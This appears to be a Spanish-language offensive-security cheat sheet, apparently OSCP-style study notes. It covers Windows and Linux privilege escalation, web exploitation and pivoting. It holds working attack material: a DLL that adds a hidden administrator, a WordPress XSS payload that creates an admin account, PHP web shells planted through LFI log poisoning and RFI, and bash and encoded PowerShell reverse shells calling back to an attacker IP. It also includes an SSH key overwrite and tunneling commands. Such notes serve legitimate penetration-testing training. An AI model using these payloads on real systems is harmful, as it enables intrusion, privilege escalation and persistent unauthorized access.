icacls .\Documents\SERVICE.exe
```
Podemos reiniciar el servicio y revisar con procmon para ver cuáles dll usa
```cmd
Restart-Service SERVICE
```
Podemos imprimir el path utilizado para ver los dll, en caso de que tengamos acceso a editar un dll, entonces podemos cambiar el path y elevar privilegios
```cmd
$env:path
```
Cambiar el dll y agregar un usuario admin
```c
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
 switch ( ul_reason_for_call )
 {
 case DLL_PROCESS_ATTACH: // A process is loading the DLL.
 int i;
 i = system ("net user dave2 password123! /add");
 i = system ("net localgroup administrators dave2 /add");
 break;
 case DLL_THREAD_ATTACH: // A process is creating a new thread.
 break;
 case DLL_THREAD_DETACH: // A thread exits normally.
 break;
 case DLL_PROCESS_DETACH: // A process unloads the DLL.
 break;
 }
 return TRUE;
}
```
```sh
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
## Unquoted Service Paths
```cmd
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
Name State PathName
---- ----- --------
...
GammaService Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
En este caso es un vector de ataque porque no tiene comillas
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
Name PathName 
... 
GammaService C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
El camino a recorrer
```cmd
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
Tenemos acceso a este directorio

```cmd
icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
BUILTIN\Administrators:(OI)(CI)(F)
BUILTIN\Users:(OI)(CI)(RX,W)   <-
 CREATOR OWNER:(OI)(CI)(IO)(F)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION 
PACKAGES:(OI)(CI)(RX)
 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED 
APPLICATION PACKAGES:(OI)(CI)(RX)
Successfully processed 1 files; Failed processing 0 files
```

```cmd
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'


Start-Service GammaService
net user
net localgroup administrators
```

## Scheduled Tasks

Revisamos los sched task
```cmd
schtasks /query /fo LIST /v
```
Revisamos permisos de ejecutables, si sale F es full access
```cmd
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
 BUILTIN\Administrators:(I)(F)
CLIENTWK220\steve:(I)(F)
CLIENTWK220\offsec:(I)(F)
```
Ya con esto podemos reemplazar el ejecutable

## SeImpersonatePrivilege

```cmd
whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name Description State 
============================= ========================================= ========
SeSecurityPrivilege Manage auditing and security log Disabled
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled 
SeUndockPrivilege Remove computer from docking station Disabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled
```
Podemos usar printspoofer
```cmd
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
PS C:\Windows\system32> whoami
whoami
nt authority\system
```
## Windows Scripts 
```sh
wpc.exe --audit -a -o report
cd /Offsec 
python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --systeminfo sys-info.txt
python windows-exploit-suggester.py --database 2018-09-02-mssb.xls --ostext 'Windows Server 2008 R2'
```

## Windows Commands 

```sh
tree /f /a
systeminfo 
type boot.ini 
hostname
ipconfig /all
netstat -ano
nmap.exe -p - -sV localhost 
net users
net localgroups 
route print
arp -A
netsh firewall show state
netsh firewall show config
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v
net start
accesschk.exe -uwcqv "Authenticated Users" *
dir network-secret.txt /s
Meterpreter Tools
run arp_scanner -r 1.1.1.0/24

use auxiliary/scanner/portscan/tcp

use post/windows/escalate/getsystem
```

## XXS to Priv Esc

### Wordpress

Payload a utilizar, este crea un usuario y obtiene un nonce que es necesario para la funcion de crear

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
r params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

Codifica el payload, esto se usa para poder evitar problemas a la hora de explotar

```js
function encode_to_javascript(string) {
 var input = string
 var output = '';
 for(pos = 0; pos < input.length; pos++) {
 output += input.charCodeAt(pos);
 if(pos != (input.length - 1)) {
 output += ",";
 }
 }
 return output;
 }
 
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

Se envía el payload, en este caso se usa un proxy
```sh
curl -i http://offsecwp --user-agent 
"<script>eval(String.fromCharCode(118,97,114,32,97,106,97 ... 115,41,59))</script>" --proxy 127.0.0.1:8080
```

## Path traversal to priv esc (Linux)

home/{user}/.ssh/id_rsa
/var/log/apache2/access.log

## Path traversal to priv esc (Windows)


Si se utiliza IIS, se deberían de revisar los siguientes archivos

C:\inetpub\logs\LogFiles\W3SVC1\.
C:\inetpub\wwwroot\web.config

## LFI

### Linux

Si hay un path traversal, se pueden revisar los logs de apache:
```sh
 curl 
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php 
HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 
Firefox/91.0"
```

Podemos enviar la siguiente línea como user agent y este será registrado en el access.log 
```sh
<?php echo system($_GET['cmd']); ?>
```

Volvemos a consultar el access.log

```sh
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

### Windows

Los logs se encuentran en el siguiente path 

C:\xampp\apache\logs\.

### Wrappers

Estos son utilizados para desplegar el código de php, por ejemplo

#### php://filter
```sh
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```
Este request muestra el admin.php, pero solamente el código html
```sh
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
Este request si devuelve el código php, porque no se ejecuta en el server y es posible leerlo

#### data://

El data sirve para poder incluir elementos como plaitext or base64 en el web server. Por ejemplo:
```sh
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
Otra forma puede ser:
```sh
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

kali@kali:~$ curl 
"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
```

## Remote File Inclusion (RFI)

python3 -m http.server 80
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

Siempre revisar si hay carpeta de uploads

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

### SSH 

```sh
ssh-keygen
```

Podemos subir el siguiente archivo

```sh
../../../../../../../root/.ssh/authorized_keys
```

Y tratar de sobreescribir el archivo de ssh

En caso de error, eliminar el known_hosts

```sh
rm ~/.ssh/known_hosts
```
### Extensiones a utilizar

.phps
.php7
.php
.phtml
.pHP

### Powershell

```sh
pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.
https://aka.ms/powershell
Type 'help' to get help.
PS> $Text = '$client = New-Object 
System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
PS> exit
```

```sh
curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-
enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA
dAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA
GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

## Ejecucion de comandos

Esta usando cmd o powershell? 
```sh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Recuerde encodearlo 

# Pivoting
```sh
Modificar -> /etc/proxychains.conf  -> socks5 127.0.0.1 <PORT> (Recomiendo 9000-1000)

proxychains firefox
proxychains nmap

Importante!!! Deben de hacer port forwarding al puerto que usan para conectarse: ejem
ssh -D 9050 root@10.10.10.1

Port Forwarding:

ssh -L 80:localhost:80 root@10.10.1.1 >>> tunneling http
ssh root@10.10.1.1 -D 127.0.0.1:8080 -N -f >> tunneling socks proxy
ssh root@10.10.1.1 -D 8834 >> tunneling socks proxy using web
```

## SSH

confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
<0:4455:172.16.50.217:445 database_admin@10.4.50.215 
Could not create directory '/home/confluence/.ssh'.
The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
database_admin@10.4.50.215's password: 
## Darse cuenta de nuevas redes
```sh
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 
1000
 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 inet 127.0.0.1/8 scope host lo
 valid_lft forever preferred_lft forever
 inet6 ::1/128 scope host 
 valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group 
default qlen 1000
 link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
 inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
 valid_lft forever preferred_lft forever
 inet6 fe80::250:56ff:fe8a:5446/64 scope link 
 valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group 
default qlen 1000
 link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
 inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
 valid_lft forever preferred_lft forever
 inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
 valid_lft forever preferred_lft forever
```
```sh
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```
En este caso hay dos tarjetas de red y dos redes distintas, lo que significa que hay un DMZ para pivotear
Creamos un port forward desde el puerto 2345 para poder redirigir el tráfico al puerto 5432 que en este caso se usará para obtener acceso
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
 

# Exfiltración de datos

# Evasion de antivirus

## Teoria pequeña

- File Engine

Responsible for both scheduled and real-time file scans.
When the engine performs a scheduled scan, it simply parses the entire file system and sends each file’s metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website.

- Memory Engine

Inspects each process’s memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks

- Network Engine

Inspects the incoming and outgoing network traffic on the local network interface

- Disassembler

Is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. 

- Emulator/Sandbox

Special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system

- Browser Plugin

Modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

- Machine Learning Engin

It enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

### Detection Methods

- Signature-based Detection

Is mostly considered a restricted list technology. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

- Heuristic-based Detection

Is a detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious. The idea is to search for various patterns and program calls

- Behavioral Detection

Dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, and searching for behaviors or actions that are considered malicious

- Machine Learning Detection

Aims to up the game by introducing ML algorithms to detect 
unknown threats by collecting and analyzing additional metadata.


# Limpiando huellas

# Tips


script /dev/null -c bash
ctrl Z
stty raw -echo;fg
reset xterm 
export TERM=xterm-256color
export SHELL=bash
source /etc/skel/.bashrc



exiftool -a -u brochure.pdf

## NTFS Streams

dir /R
powershell Get-Content -Path "hm.txt" -Stream "root.txt"

